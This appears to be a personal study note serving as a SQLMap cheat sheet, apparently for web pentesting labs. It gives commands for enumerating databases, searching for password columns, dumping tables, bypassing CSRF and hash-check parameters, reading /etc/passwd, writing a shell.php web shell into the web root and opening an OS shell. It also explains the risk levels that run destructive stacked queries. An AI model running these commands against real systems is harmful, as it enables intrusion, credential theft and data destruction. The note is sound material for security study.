---
type: tool
category: sql
tags:
  - tool
---
# Overview

## Commands
One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261021083532.png)
By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command.

#### Default scan
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

#### Map/Crawl Webpage for forms
Not the best.
```bash
sqlmap -u "http://154.57.164.72:39803/" --forms --crawl=2 --batch --level=3
```

#### ENUM DB Schema--
Retrieve the structure of DB's and tables:
```bash
sqlmap -u "http://www.example.com/?id=1" --schema --exclude-sysdbs
```

#### ENUM specific tables
When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator.
If we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```
or for columns containing `pass`:
```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

#### Check if User is DBA
Check if current user is DBA:
```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

#### ENUM Privileges
```bash
sqlmap -u „http://target/case.php?id=1“ --privileges --batch
```
#### Read local files
Will save the file content to a local file:
```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

#### Write local files
```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
##### OS Shell
If writing files is possible we can also try to establish an `os-shell` :
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
If it fails, it is worth trying with other available `techniques` , e.g:
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

#### Randomize UID
Make sure that an `UID` has a random value for every new request:
```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

#### Calculated Parameter Bypass
Most often, one parameter value has to contain the message digest (e.g. `h=MD5(id)`) of another one. To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target:
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

#### Specify/Bypass CSRF-Token
When the `CSRF-Token` name is a non standard one, we need to tell `sqlmap` its name:
```bash
sqlmap -r request.txt --csrf-token="NAME_DES_TOKENS" --batch
```

#### SQL-Input in cookie-field
It is possible, that the `cookie` parameter of the http-header is the sql-input field. In this case we can perform a simple scan like this:
```bash
sqlmap -u http://154.57.164.83:32041/case3.php --cookie="id=1*"
```

#### Complex POST-header
If we are confronted with a complex Request-Header, we can save it in e.g. `jason` format and pass it on to `sqlmap`:
```bash
sqlmap -r request.txt
```

#### Dump Table contents 
When we are confronted with or complex SQLi such as e.g. `time-based blind` or `Boolean-based` it is recommended to dump the needed table contents directly with `sqlmap`:
```bash
sqlmap -u "http://154.57.164.78:30601/case5.php?id=1" -D DB -T TABLE -C COLUMNE --dump --no-cast
```

#### Temper 
## Important Parameter
sqlmap
	`--batch` = answers prompts with default (Y/n)
	`--cookie='PHPSESSID=VALUE'` = feed cookie to sqlmap
	`--parse-errors` = parse the DBMS errors (if any) and displays them
	`-t FILE` = stores the whole traffic content in a file
	`-v 6` = verbose, prints all errors and full HTTP-requests to the terminal
	`--proxy="http://127.0.0.1:8081"` = redirect traffic to proxy
	`--level=[1-5]` =  extends both vectors(e.g escape characters) and boundaries being used (default level is 1)
	`--risk=[1-3]` = defines risk level, complexity of r
	`--threads=5` = number of threads


### Levels Overview
`--level` determines which parts of the HTTP request are scanned for vulnerabilities.

|**Level**|**Focus / Target**|**Description**|
|---|---|---|
|**Level 1 (Standard)**|GET & POST parameters (body)|Tests only standard GET and POST parameters. Sufficient for 80% of all standard forms.|
|**Level 2**|Cookies|Also targets cookies (developers often forget that cookies are included in SQL queries).|
|**Level 3**|HTTP headers (`User-Agent`, `Referer`)|Also checks HTTP headers. A classic example: an admin log that writes the `User-Agent` to the database without validating it.|
|**Level 4 & 5**|Exotic headers, Host headers & deep payloads|Goes all out to test even more exotic headers, host headers, and deeper payload combinations.|

The higher the level, the more advanced payload sets are loaded. This means that at higher levels, sqlmap doesn't just blindly try a simple`'`; instead, it also sends more complex combinations (such as`')`, `'))`, or `"`) to locations that would have been completely ignored at Level 1.
### Risk levels Overview
`--risk` determines what types of SQL commands sqlmap is allowed to execute. By default, sqlmap is extremely cautious so as not to corrupt the target table.

|**Risk Level**|**Focus / Behavior**|**Description**|
|---|---|---|
|**Risk 1 (Standard)**|Harmless queries|Standard queries that do not modify any data. By default, sqlmap is extremely cautious to avoid destroying the target table.|
|**Risk 2**|Time-based & risky OR-based queries|Adds heavier time-based and riskier OR-based queries. Theoretically, this can cause high load on poorly written databases (DoS risk for the server).|
|**Risk 3**|Stacked queries & data manipulation|Allows stacked queries (multiple queries using a semicolon `;`). Here, sqlmap appends commands like `; DROP TABLE` or data manipulations. This is only used in a pentest when you know exactly what you are doing or want to destroy databases.|